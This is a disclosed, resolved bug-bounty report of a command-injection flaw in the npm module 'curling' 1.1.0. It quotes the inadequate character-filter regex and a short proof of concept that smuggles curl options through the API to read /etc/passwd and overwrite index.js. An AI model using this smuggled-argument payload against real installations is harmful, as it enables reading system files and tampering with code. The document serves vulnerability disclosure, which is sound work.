# [C] [curling] Remote Code Execution

## Summary
Severity: Critical
Program: Node.js third-party modules
Weakness: Command Injection - Generic
Reporter: solov9ev
State: resolved
Disclosed: 2021-01-14T08:40:27.267Z
Source: https://hackerone.com/reports/973386

## Details
I would like to report `RCE` in `curling`
I can bypass the security check for special characters, read / overwrite file

# Module

**module name:** curling
**version:** 1.1.0
**npm page:** `https://www.npmjs.com/package/curling`

## Module Description

A node wrapper for curl with a very simple api.

## Module Stats

[156] weekly downloads

# Vulnerability

## Vulnerability Description

The regular expression does not perform proper validation and, when combined with curl, leads to disastrous consequences:
```javascript
/[`$&{}[;|]/g.test(command)
```

## Steps To Reproduce:

- Run `npm i curling`

- Create and run the following POC index.js:

```javascript
const curling = require('curling');

curling.run('file:///etc/passwd -o ./index.js', function(d, payload){console.log(payload)});
```


_Trimmed to 38 lines — full report: https://hackerone.com/reports/973386_
